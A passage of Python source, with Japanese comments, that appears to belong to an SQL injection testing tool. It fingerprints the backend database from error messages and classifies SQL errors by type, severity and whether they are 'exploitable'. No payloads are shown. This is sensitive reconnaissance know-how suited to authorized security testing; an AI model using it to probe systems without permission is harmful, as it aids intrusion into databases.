            # Day 1強化: より詳細なエラー分類を使用
            diff = error_classification["type"] if error_classification["type"] != "none" else basic_diff

            # Day 1強化: DB検出情報を結果に含める
            return {
                "status": status,
                "diff": diff,
                "body_snippet": body[:200],
                "elapsed_seconds": elapsed,
                "db_detection": db_detection,
                "error_classification": error_classification,
            }

        except Exception as e:
            logger.error(f"[{self.name}] Request failed: {e}")
            return {
                "status": 0,
                "diff": "error",
                "body_snippet": str(e),
                "elapsed_seconds": 0.0,
            }

    # Day 1強化: DB別エラー検出メソッド
    def _detect_database_type(self, body: str) -> Dict[str, Any]:
        """
        レスポンスボディからデータベースタイプを検出
        Returns: {"type": "mysql|postgresql|sqlite|mssql|oracle|unknown", "confidence": float, "patterns": list}
        """
        body_lower = body.lower()
        db_signatures = {
            "mysql": {
                "patterns": [
                    r"mysql_fetch_",
                    r"mysqli_",
                    r"#1064",
                    r"#1062",
                    r"#1146",
                    r"#1054",
                    r"#1366",
                    r"#1292",
                    r"you have an error in your sql syntax.*mysql",
                    r"warning.*mysql",
                ],
                "keywords": ["mysql", "mariadb"]
            },
            "postgresql": {
                "patterns": [
                    r"postgresql",
                    r"pqerror",
                    r"pg_query",
                    r"pg_connect",
                    r"psycopg2",
                    r"psql",
                    r"error.*postgresql",
                    r"warning.*postgresql",
                ],
                "keywords": ["postgresql", "psycopg2"]
            },
            "sqlite": {
                "patterns": [
                    r"sqlite3",
                    r"sqlite_",
                    r"sqliteexception",
                    r"near\s+\w+:\s*syntax error",
                    r"unrecognized token",
                    r"incomplete input",
                    r"misuse of aggregate",
                ],
                "keywords": ["sqlite", "sqlite3"]
            },
            "mssql": {
                "patterns": [
                    r"microsoft sql",
                    r"mssql",
                    r"odbc.*sql server",
                    r"sql server.*error",
                    r"oledb",
                    r"sqlcmd",
                ],
                "keywords": ["mssql", "sql server", "microsoft"]
            },
            "oracle": {
                "patterns": [
                    r"ora-\d{4,5}",
                    r"oracle",
                    r"pl/sql",
                    r"tns:",
                    r"oraclerror",
                    r"ora_",
                ],
                "keywords": ["oracle", "ora-"]
            },
        }

        scores = {db: 0 for db in db_signatures}
        matched_patterns = []

        for db_name, signatures in db_signatures.items():
            # パターンマッチング
            for pattern in signatures["patterns"]:
                if re.search(pattern, body_lower):
                    scores[db_name] += 2
                    matched_patterns.append(f"{db_name}:{pattern}")
            # キーワードマッチング
            for keyword in signatures["keywords"]:
                if keyword in body_lower:
                    scores[db_name] += 1

        if not matched_patterns:
            return {"type": "unknown", "confidence": 0.0, "patterns": []}

        best_db = max(scores, key=scores.get)
        best_score = scores[best_db]
        total_score = sum(scores.values())

        confidence = min(1.0, best_score / max(total_score, 3))

        return {
            "type": best_db if best_score > 0 else "unknown",
            "confidence": round(confidence, 2),
            "patterns": matched_patterns,
            "all_scores": scores,
        }

    def _classify_sql_error(self, body: str) -> Dict[str, Any]:
        """
        SQLエラーを詳細に分類
        Returns: {"type": "syntax|auth|schema|data|none", "severity": "high|medium|low", "details": str}
        """
        body_lower = body.lower()

        # シンタックスエラーパターン
        syntax_patterns = [
            r"syntax error",
            r"unclosed quotation mark",
            r"unexpected token",
            r"unexpected end of statement",
            r"parse error",
            r"invalid syntax",
            r"near.*syntax error",
            r"missing.*in expression",
            r"missing.*at or near",
        ]

        # 認証/権限エラーパターン
        auth_patterns = [
            r"access denied",
            r"permission denied",
            r"insufficient privileges",
            r"not authorized",
            r"login failed",
            r"authentication failed",
            r"invalid user",
            r"wrong password",
        ]

        # スキーマ/テーブルエラーパターン
        schema_patterns = [
            r"table.*doesn't exist",
            r"table.*does not exist",
            r"unknown table",
            r"unknown column",
            r"column.*not found",
            r"no such table",
            r"no such column",
            r"invalid object name",
        ]

        # データ型エラーパターン
        data_patterns = [
            r"data type mismatch",
            r"invalid.*for type",
            r"incorrect.*value",
            r"out of range",
            r"overflow",
            r"truncated",
        ]

        for pattern in syntax_patterns:
            if re.search(pattern, body_lower):
                return {
                    "type": "syntax",
                    "severity": "high",
                    "details": f"Syntax error detected: {pattern}",
                    "exploitable": True,
                }

        for pattern in auth_patterns:
            if re.search(pattern, body_lower):
                return {
                    "type": "auth",
                    "severity": "medium",
                    "details": f"Authentication/Permission error: {pattern}",
                    "exploitable": False,
                }

        for pattern in schema_patterns:
            if re.search(pattern, body_lower):
                return {
                    "type": "schema",
                    "severity": "medium",
                    "details": f"Schema error (information leakage): {pattern}",
                    "exploitable": True,
                }

        for pattern in data_patterns:
            if re.search(pattern, body_lower):
                return {
                    "type": "data",
                    "severity": "low",
                    "details": f"Data type error: {pattern}",
                    "exploitable": True,
                }

        return {"type": "none", "severity": "none", "details": "", "exploitable": False}
